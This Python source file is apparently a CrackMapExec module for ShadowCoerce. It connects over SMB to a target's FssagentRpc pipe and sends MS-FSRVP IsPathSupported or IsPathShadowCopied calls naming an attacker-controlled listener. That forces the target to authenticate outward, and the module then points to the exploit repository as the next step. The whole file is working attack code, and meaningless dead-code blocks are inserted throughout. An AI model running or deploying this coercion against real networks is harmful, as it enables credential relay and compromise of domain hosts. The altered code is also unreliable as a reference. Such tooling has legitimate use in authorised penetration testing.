import time
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.smbconnection import SessionError
from cme.logger import cme_logger

class CMEModule:
    name = 'shadowcoerce'
    description = 'Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        if False:
            i = 10
            return i + 15
        '\n        IPSC             Use IsPathShadowCopied (default: False). ex. IPSC=true\n        LISTENER         Listener IP address (default: 127.0.0.1)\n        '
        self.ipsc = False
        self.listener = '127.0.0.1'
        if 'LISTENER' in module_options:
            self.listener = module_options['LISTENER']
        if 'IPSC' in module_options:
            self.ipsc = bool(module_options['IPSC'])

    def on_login(self, context, connection):
        if False:
            print('Hello World!')
        c = CoerceAuth()
        dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe='FssagentRpc', doKerberos=connection.kerberos, dcHost=connection.kdcHost)
        if dce == 1:
            context.log.debug('First try failed. Creating another dce connection...')
            time.sleep(2)
            dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe='FssagentRpc')
        if self.ipsc:
            context.log.debug('ipsc = %s', self.ipsc)
            context.log.debug('Using IsPathShadowCopied!')
            result = c.IsPathShadowCopied(dce, self.listener)
        else:
            context.log.debug('ipsc = %s', self.ipsc)
            context.log.debug('Using the default IsPathSupported')
            result = c.IsPathSupported(dce, self.listener)
        try:
            dce.disconnect()
        except SessionError as e:
            context.log.debug(f'Error disconnecting DCE session: {e}')
        if result:
            context.log.highlight('VULNERABLE')
            context.log.highlight('Next step: https://github.com/ShutdownRepo/ShadowCoerce')
        else:
            context.log.debug('Target not vulnerable to ShadowCoerce')

class DCERPCSessionError(DCERPCException):

    def __init__(self, error_string=None, error_code=None, packet=None):
        if False:
            for i in range(10):
                print('nop')
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        if False:
            for i in range(10):
                print('nop')
        key = self.error_code
        error_messages = system_errors.ERROR_MESSAGES
        error_messages.update(MSFSRVP_ERROR_CODES)
        if key in error_messages:
            error_msg_short = error_messages[key][0]
            error_msg_verbose = error_messages[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code
MSFSRVP_ERROR_CODES = {2147942405: ('E_ACCESSDENIED', 'The caller does not have the permissions to perform the operation'), 2147942487: ('E_INVALIDARG', 'One or more arguments are invalid.'), 2147754753: ('FSRVP_E_BAD_STATE', 'A method call was invalid because of the state of the server.'), 2147754774: ('FSRVP_E_SHADOW_COPY_SET_IN_PROGRESS', 'A call was made to either SetContext (Opnum 1) or StartShadowCopySet (Opnum 2) while the creation of another shadow copy set is in progress.'), 2147754764: ('FSRVP_E_NOT_SUPPORTED', 'The file store that contains the share to be shadow copied is not supported by the server.'), 258: ('FSRVP_E_WAIT_TIMEOUT', 'The wait for a shadow copy commit or expose operation has timed out.'), 4294967295: ('FSRVP_E_WAIT_FAILED', 'The wait for a shadow copy commit expose operation has failed.'), 2147754765: ('FSRVP_E_OBJECT_ALREADY_EXISTS', 'The specified object already exists.'), 2147754760: ('FSRVP_E_OBJECT_NOT_FOUND', 'The specified object does not exist.'), 2147754779: ('FSRVP_E_UNSUPPORTED_CONTEXT', 'The specified context value is invalid.'), 2147755265: ('FSRVP_E_SHADOWCOPYSET_ID_MISMATCH', 'The provided ShadowCopySetId does not exist.')}

class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (('ShareName', WSTR),)

class IsPathSupportedResponse(NDRCALL):
    structure = (('SupportedByThisProvider', BOOL), ('OwnerMachineName', LPWSTR))

class IsPathShadowCopied(NDRCALL):
    opnum = 9
    structure = (('ShareName', WSTR),)

class IsPathShadowCopiedResponse(NDRCALL):
    structure = (('ShadowCopyPresent', BOOL), ('ShadowCopyCompatibility', LONG))
OPNUMS = {8: (IsPathSupported, IsPathSupportedResponse), 9: (IsPathShadowCopied, IsPathShadowCopiedResponse)}

class CoerceAuth:

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, pipe, doKerberos, dcHost):
        if False:
            while True:
                i = 10
        binding_params = {'FssagentRpc': {'stringBinding': 'ncacn_np:%s[\\PIPE\\FssagentRpc]' % target, 'UUID': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0')}}
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        dce = rpctransport.get_dce_rpc()
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)
        dce.set_credentials(*rpctransport.get_credentials())
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        cme_logger.info('Connecting to %s' % binding_params[pipe]['stringBinding'])
        try:
            dce.connect()
        except Exception as e:
            if str(e).find('STATUS_PIPE_NOT_AVAILABLE') >= 0:
                dce.disconnect()
                return 1
            cme_logger.debug('Something went wrong, check error status => %s' % str(e))
        cme_logger.info('Connected!')
        cme_logger.info('Binding to %s' % binding_params[pipe]['UUID'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['UUID']))
        except Exception as e:
            cme_logger.debug('Something went wrong, check error status => %s' % str(e))
        cme_logger.info('Successfully bound!')
        return dce

    def IsPathShadowCopied(self, dce, listener):
        if False:
            return 10
        cme_logger.debug('Sending IsPathShadowCopied!')
        try:
            request = IsPathShadowCopied()
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            dce.request(request)
        except Exception as e:
            cme_logger.debug('Something went wrong, check error status => %s', str(e))
            cme_logger.debug('Attack may of may not have worked, check your listener...')
            return False
        return True

    def IsPathSupported(self, dce, listener):
        if False:
            while True:
                i = 10
        cme_logger.debug('Sending IsPathSupported!')
        try:
            request = IsPathSupported()
            request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
            dce.request(request)
        except Exception as e:
            cme_logger.debug('Something went wrong, check error status => %s', str(e))
            cme_logger.debug('Attack may of may not have worked, check your listener...')
            return False
        return True